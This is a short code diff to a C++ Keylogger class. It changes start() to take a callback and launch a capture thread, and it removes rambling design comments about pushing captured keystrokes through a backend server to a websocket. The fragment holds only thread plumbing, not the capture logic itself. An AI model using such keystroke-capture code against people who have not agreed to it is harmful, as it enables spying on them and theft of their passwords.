@@ -55,7 +55,7 @@ Keylogger::~Keylogger() {
     stop();
 }
 
-bool Keylogger::start() {
+bool Keylogger::start(std::function<void(std::string)> callback) {
     if (running_.load()) return true;
 
     if (!find_keyboard_()) {
@@ -69,17 +69,9 @@ bool Keylogger::start() {
     }
 
     running_.store(true);
-    // Create pipe for inter-thread communication or just use a callback?
-    // The class design in header uses 'reader_loop_(std::ostream& output)'.
-    // But we need to update the server.
-    // We will change the design slightly to use a callback or just print to stdout which is captured?
-    // Wait, backend_server needs to push this to websocket.
-    // The current header has 'reader_loop_(std::ostream& output)'.
-    // We'll spawn the thread in backend_server instead, or pass a callback here?
-    // Let's modify start() to take a callback. But start() signature is fixed in .hpp?
-    // I can modify .hpp too if needed.
-    // For now, let's implement the loop and let it write to a member buffer or callback.
-    // Actually, let's just use start(callback).
+    event_thread_ = std::thread([this, callback]() {
+        this->run_capture(callback);
+    });
 
     return true;
 }
